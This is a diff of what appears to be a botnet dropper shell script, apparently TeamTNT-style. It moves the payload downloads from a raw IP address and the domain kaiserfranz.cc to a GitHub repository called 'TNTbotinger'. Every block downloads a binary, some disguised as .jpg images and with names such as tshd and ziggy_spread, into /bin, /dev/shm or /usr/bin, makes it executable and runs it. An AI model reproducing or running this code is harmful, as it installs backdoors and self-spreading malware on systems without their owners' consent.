@@ -53,7 +53,7 @@ loadthisfile http://kaiserfranz.cc/sbin /bin/sbin
 chmod +x /bin/sbin
 /bin/sbin
 if [ ! -f "/bin/sbin" ]; then
-loadthisfile http://85.214.149.236:443/sugarcrm/themes/default/images/default.jpg /dev/shm/sbin
+loadthisfile https://github.com/nandakrr/TNTbotinger/blob/main/default.jpg /dev/shm/sbin
 chmod +x /dev/shm/sbin
 /dev/shm/sbin
 fi
@@ -63,7 +63,7 @@ if [ -f "/usr/bin/tshd" ]; then
 echo 'FOUND: tshd'
 else
 echo 'MISSING: tshd'
-loadthisfile http://85.214.149.236:443/sugarcrm/themes/default/images/tshd.jpg /usr/bin/tshd
+loadthisfile https://github.com/nandakrr/TNTbotinger/blob/main/tshd.jpg /usr/bin/tshd
 chmod +x /usr/bin/tshd
 /usr/bin/tshd
 fi
@@ -72,7 +72,7 @@ if [ -f "/usr/bin/kube" ]; then
 echo 'FOUND: kube'
 else
 echo 'MISSING: kube'
-loadthisfile http://kaiserfranz.cc/ziggy_spread /usr/bin/kube
+loadthisfile https://github.com/nandakrr/TNTbotinger/blob/main/ziggy_spread /usr/bin/kube
 chmod +x /usr/bin/kube
 /usr/bin/kube
 fi
@@ -81,7 +81,7 @@ if [ -f "/usr/bin/bioset" ]; then
 echo 'FOUND: bioset'
 else
 echo 'MISSING: bioset'
-loadthisfile http://85.214.149.236:443/sugarcrm/themes/default/images/bioset.jpg /usr/bin/bioset
+loadthisfile https://github.com/nandakrr/TNTbotinger/blob/main/bioset.jpg /usr/bin/bioset
 chmod +x /usr/bin/bioset
 /usr/bin/bioset
 fi
